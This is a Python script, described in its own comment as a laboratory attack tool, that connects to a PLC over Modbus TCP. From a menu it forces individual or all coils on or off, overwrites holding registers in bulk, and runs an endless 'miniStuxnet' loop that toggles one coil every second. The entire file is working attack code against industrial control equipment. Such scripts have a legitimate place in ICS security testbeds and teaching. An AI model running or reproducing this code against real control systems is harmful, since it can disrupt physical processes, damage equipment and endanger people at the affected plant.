from time import sleep
from pymodbus.client import ModbusTcpClient

# Controlled laboratory attack script.
# Historical addresses used in the previous testbed included 1281, 2049 and 3120.


def coil_on(client):
    target_address = int(input("\nEnter coil address to force ON: "))
    result = client[0].write_coil(target_address, True, device_id=client[1])
    print("Coil forced ON" if not result.isError() else "Error forcing coil ON")


def coil_off(client):
    target_address = int(input("\nEnter coil address to force OFF: "))
    result = client[0].write_coil(target_address, False, device_id=client[1])
    print("Coil forced OFF" if not result.isError() else "Error forcing coil OFF")


def all_coils_on(client):
    for i in range(0, 65536):
        client[0].write_coil(i, True, device_id=client[1])
        print(f"Forcing coil {i} ON")


def all_coils_off(client):
    for i in range(0, 65536):
        client[0].write_coil(i, False, device_id=client[1])
        print(f"Forcing coil {i} OFF")


def write_holding_register(client):
    target = int(input("\nEnter holding-register address: "))
    value = int(input("\nEnter new value: "))
    result = client[0].write_register(target, value, device_id=client[1])
    print("Register overwritten" if not result.isError() else "Register write error")


def write_all_holding_registers(client):
    value = int(input("\nEnter new value: "))
    for i in range(0, 65536):
        client[0].write_register(i, value, device_id=client[1])
        print(f"Overwriting register {i}")


def mini_stuxnet(client):
    print("Use case: miniStuxnet")
    while True:
        client[0].write_coil(2049, True, device_id=client[1])
        sleep(1)
        client[0].write_coil(2049, False, device_id=client[1])
        sleep(1)


def main():
    print("PLC VARIABLE MODIFICATION\n")
    plc_ip = "192.168.0.15"
    plc_port = 502
    device_id = 1

    print(f"PLC IP: {plc_ip}")
    print(f"Modbus port: {plc_port}")
    client = [ModbusTcpClient(plc_ip, port=plc_port), device_id]

    if not client[0].connect():
        print("\nCould not connect to PLC. Exiting.")
        return

    print(
        "\nOperations:\n"
        "1. Force one coil ON\n"
        "2. Force one coil OFF\n"
        "3. Force all coils ON\n"
        "4. Force all coils OFF\n"
        "5. Overwrite one holding register\n"
        "6. Overwrite all holding registers\n"
        "7. miniStuxnet\n"
    )
    operation = int(input("Select operation: "))

    actions = {
        1: coil_on,
        2: coil_off,
        3: all_coils_on,
        4: all_coils_off,
        5: write_holding_register,
        6: write_all_holding_registers,
        7: mini_stuxnet,
    }

    action = actions.get(operation)
    if action:
        action(client)

    client[0].close()


if __name__ == "__main__":
    main()
